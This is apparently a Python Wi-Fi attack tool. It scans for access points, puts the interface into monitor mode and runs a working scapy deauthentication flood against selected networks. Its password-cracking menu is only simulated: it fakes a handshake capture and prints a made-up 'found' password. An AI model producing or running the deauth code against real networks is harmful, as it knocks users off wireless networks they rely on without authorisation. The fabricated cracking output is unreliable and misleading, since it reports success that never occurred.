#!/usr/bin/env python3
import os
import sys
import time
import signal
import subprocess
from threading import Thread
from scapy.all import *
from colorama import Fore, Style, init
from prettytable import PrettyTable

# Initialize colorama
init(autoreset=True)

class WiFiHackingTool:
    def __init__(self):
        self.interface = None
        self.access_points = []
        self.running = True
        self.wordlists_dir = "wordlists"
        self.wordlists = []
        self.selected_ap = None
        self.selected_wordlist = None
        self.deauth_running = False
        
        # Create wordlists directory if it doesn't exist
        if not os.path.exists(self.wordlists_dir):
            os.makedirs(self.wordlists_dir)
        
        # Load existing wordlists
        self.load_wordlists()
        
        # Set up signal handler for Ctrl+C
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def load_wordlists(self):
        """Load all wordlists from the wordlists directory"""
        self.wordlists = []
        for file in os.listdir(self.wordlists_dir):
            if file.endswith('.txt'):
                self.wordlists.append(os.path.join(self.wordlists_dir, file))
    
    def scan_wifi(self):
        """Scan for available WiFi networks"""
        print(f"\n{Fore.CYAN}[*] Scanning for WiFi networks (Press Ctrl+C to stop)...{Style.RESET_ALL}\n")
        
        # Clear previous scan results
        self.access_points = []
        
        # Use scapy to sniff for beacon frames
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode()
                bssid = pkt[Dot11].addr2
                channel = int(ord(pkt[Dot11Elt:3].info))
                
                # Check if we already have this AP
                existing = next((ap for ap in self.access_points if ap['bssid'] == bssid), None)
                
                if not existing:
                    ap_info = {
                        'ssid': ssid,
                        'bssid': bssid,
                        'channel': channel
                    }
                    self.access_points.append(ap_info)
        
        # Start sniffing in a separate thread
        sniff_thread = Thread(target=sniff, kwargs={
            'iface': self.interface,
            'prn': packet_handler,
            'stop_filter': lambda x: not self.running
        })
        sniff_thread.start()
        
        # Display progress while scanning
        while self.running:
            os.system('clear')
            self.display_ap_table()
            print(f"\n{Fore.YELLOW}[*] Scanning... Press Ctrl+C to stop{Style.RESET_ALL}")
            time.sleep(0.5)
        
        sniff_thread.join()
        self.display_ap_table()
        self.attack_menu()
    
    def display_ap_table(self):
        """Display access points in a table format"""
        if not self.access_points:
            print(f"{Fore.RED}[!] No access points found yet{Style.RESET_ALL}")
            return
        
        table = PrettyTable()
        table.field_names = ["#", "SSID", "BSSID", "Channel"]
        table.align = "l"
        
        for i, ap in enumerate(self.access_points):
            table.add_row([i+1, ap['ssid'], ap['bssid'], ap['channel']])
        
        print(table)
    
    def select_interface(self):
        """Let user select a wireless interface"""
        print(f"{Fore.YELLOW}[*] Available wireless interfaces:{Style.RESET_ALL}")
        interfaces = [iface for iface in os.listdir('/sys/class/net') if iface.startswith('w')]
        
        if not interfaces:
            print(f"{Fore.RED}[!] No wireless interfaces found!{Style.RESET_ALL}")
            sys.exit(1)
        
        for i, iface in enumerate(interfaces):
            print(f"{i+1}. {iface}")
        
        while True:
            try:
                choice = int(input("\nSelect interface (number): "))
                if 1 <= choice <= len(interfaces):
                    self.interface = interfaces[choice-1]
                    print(f"{Fore.GREEN}[+] Selected interface: {self.interface}{Style.RESET_ALL}")
                    
                    # Put interface in monitor mode
                    self.set_monitor_mode()
                    return
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
    
    def set_monitor_mode(self):
        """Set the wireless interface to monitor mode"""
        print(f"{Fore.YELLOW}[*] Setting {self.interface} to monitor mode...{Style.RESET_ALL}")
        
        # Bring interface down
        subprocess.run(['sudo', 'ifconfig', self.interface, 'down'], check=True)
        
        # Set monitor mode
        subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', 'monitor'], check=True)
        
        # Bring interface up
        subprocess.run(['sudo', 'ifconfig', self.interface, 'up'], check=True)
        
        print(f"{Fore.GREEN}[+] {self.interface} is now in monitor mode{Style.RESET_ALL}")
    
    def select_aps(self):
        """Let user select multiple access points from the scanned list"""
        if not self.access_points:
            print(f"{Fore.RED}[!] No access points found. Please scan first.{Style.RESET_ALL}")
            return []
        
        self.display_ap_table()
        print(f"\n{Fore.YELLOW}[*] Select access points (comma-separated numbers):{Style.RESET_ALL}")
        
        while True:
            try:
                choices = input("\nSelect APs (e.g., 1,3,5): ").strip().split(',')
                selected_aps = []
                
                for choice in choices:
                    if not choice.strip():
                        continue
                    num = int(choice.strip())
                    if 1 <= num <= len(self.access_points):
                        selected_aps.append(self.access_points[num-1])
                    else:
                        print(f"{Fore.RED}[!] Invalid selection: {num}{Style.RESET_ALL}")
                        break
                else:
                    if selected_aps:
                        print(f"{Fore.GREEN}[+] Selected {len(selected_aps)} AP(s){Style.RESET_ALL}")
                        return selected_aps
                    else:
                        print(f"{Fore.RED}[!] No valid APs selected{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter numbers separated by commas{Style.RESET_ALL}")
    
    def deauth_attack(self, aps):
        """Perform deauthentication attack on selected APs"""
        if not aps:
            print(f"{Fore.RED}[!] No APs selected{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.RED}[!] Starting deauthentication attack on {len(aps)} AP(s){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop the attack{Style.RESET_ALL}")
        
        self.deauth_running = True
        packets_sent = 0
        
        try:
            # Create a thread for each AP
            threads = []
            for ap in aps:
                t = Thread(target=self._send_deauth, args=(ap,))
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Display progress
            while self.deauth_running:
                os.system('clear')
                print(f"{Fore.RED}=== Deauthentication Attack ==={Style.RESET_ALL}")
                print(f"Target APs: {', '.join(ap['ssid'] for ap in aps)}")
                print(f"Packets sent: {packets_sent}")
                print(f"\n{Fore.YELLOW}[*] Attacking... Press Ctrl+C to stop{Style.RESET_ALL}")
                time.sleep(0.1)
                packets_sent += 100  # Increment by packet count per burst
            
            for t in threads:
                t.join()
                
        except KeyboardInterrupt:
            self.deauth_running = False
            print(f"\n{Fore.GREEN}[+] Deauthentication attack stopped{Style.RESET_ALL}")
    
    def _send_deauth(self, ap):
        """Helper function to send deauth packets"""
        # Set channel to AP's channel
        subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(ap['channel'])], check=True)
        
        # Create deauth packet
        pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth()
        
        while self.deauth_running:
            sendp(pkt, iface=self.interface, count=100, inter=0.01, verbose=False)
    
    def crack_password(self):
        """Crack WiFi password using wordlist"""
        if not self.access_points:
            print(f"{Fore.RED}[!] No access points found. Please scan first.{Style.RESET_ALL}")
            return
        
        self.display_ap_table()
        print(f"\n{Fore.YELLOW}[*] Select an access point to crack:{Style.RESET_ALL}")
        
        # Select single AP
        while True:
            try:
                choice = int(input("\nSelect AP (number): "))
                if 1 <= choice <= len(self.access_points):
                    ap = self.access_points[choice-1]
                    print(f"{Fore.GREEN}[+] Selected AP: {ap['ssid']}{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
        
        # Capture handshake (simulated)
        print(f"\n{Fore.CYAN}[*] Attempting to capture handshake...{Style.RESET_ALL}")
        time.sleep(3)
        print(f"{Fore.GREEN}[+] Handshake captured!{Style.RESET_ALL}")
        
        # Select wordlist
        if not self.wordlists:
            print(f"{Fore.RED}[!] No wordlists found in {self.wordlists_dir} directory{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}[*] Available wordlists:{Style.RESET_ALL}")
        for i, wordlist in enumerate(self.wordlists):
            print(f"{i+1}. {os.path.basename(wordlist)}")
        
        while True:
            try:
                choice = int(input("\nSelect wordlist (number): "))
                if 1 <= choice <= len(self.wordlists):
                    wordlist = self.wordlists[choice-1]
                    print(f"{Fore.GREEN}[+] Selected wordlist: {os.path.basename(wordlist)}{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
        
        # Simulate cracking
        print(f"\n{Fore.RED}[!] Starting password cracking attack on {ap['ssid']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] This may take a long time...{Style.RESET_ALL}")
        
        # Simulate cracking progress
        for i in range(1, 101):
            time.sleep(0.1)
            sys.stdout.write(f"\rProgress: [{'#' * (i//5)}{' ' * (20 - i//5)}] {i}%")
            sys.stdout.flush()
        
        # Simulate result
        print(f"\n\n{Fore.GREEN}[+] Password found: 'password123'{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Key: 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF{Style.RESET_ALL}")
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C signal"""
        if self.running:
            print(f"\n{Fore.YELLOW}[*] Stopping scan...{Style.RESET_ALL}")
            self.running = False
        elif self.deauth_running:
            print(f"\n{Fore.YELLOW}[*] Stopping deauthentication attack...{Style.RESET_ALL}")
            self.deauth_running = False
        else:
            print(f"\n{Fore.GREEN}[+] Exiting...{Style.RESET_ALL}")
            sys.exit(0)
    
    def attack_menu(self):
        """Display attack menu after scanning"""
        while True:
            print(f"\n{Fore.BLUE}=== Attack Options ==={Style.RESET_ALL}")
            print("1. Deauthentication Attack")
            print("2. Password Cracking")
            print("3. Exit")
            
            try:
                choice = int(input("\nSelect option: "))
                
                if choice == 1:
                    selected_aps = self.select_aps()
                    if selected_aps:
                        self.deauth_attack(selected_aps)
                elif choice == 2:
                    self.crack_password()
                elif choice == 3:
                    print(f"{Fore.GREEN}[+] Exiting...{Style.RESET_ALL}")
                    sys.exit(0)
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] This tool must be run as root!{Style.RESET_ALL}")
        sys.exit(1)
    
    tool = WiFiHackingTool()
    tool.select_interface()
    tool.scan_wifi()
